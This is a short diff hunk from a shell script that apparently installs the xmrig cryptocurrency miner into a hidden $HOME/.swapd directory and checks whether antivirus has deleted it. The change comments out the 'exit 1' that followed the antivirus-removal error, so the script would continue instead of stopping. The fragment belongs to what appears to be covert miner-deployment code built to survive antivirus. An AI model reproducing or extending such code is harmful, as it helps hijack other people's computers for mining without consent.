@@ -209,7 +209,7 @@ if (test $? -ne 0); then
     else 
       echo "ERROR: Stock version of $HOME/.swapd/xmrig was removed by antivirus too"
     fi
-    exit 1
+#    exit 1
   fi
 fi
 
